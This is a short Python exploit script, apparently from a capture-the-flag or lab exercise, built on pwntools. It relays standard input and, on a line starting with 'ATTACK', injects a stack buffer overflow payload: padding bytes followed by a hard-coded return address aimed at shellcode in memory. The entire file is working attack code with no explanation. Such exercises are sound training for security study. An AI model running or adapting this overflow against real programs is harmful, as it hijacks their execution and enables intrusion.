#!/usr/bin/python3
from pwn import *
import sys

shellcode_address = 0xffffd548

while True:
    x = input()
    if x.upper().startswith("ATTACK"):
        payload = b'A'*1284
        payload += b'B'*208
        payload += p32(shellcode_address)
        sys.stdout.buffer.write(payload)
    sys.stdout.buffer.write(x.encode() + b'\n')
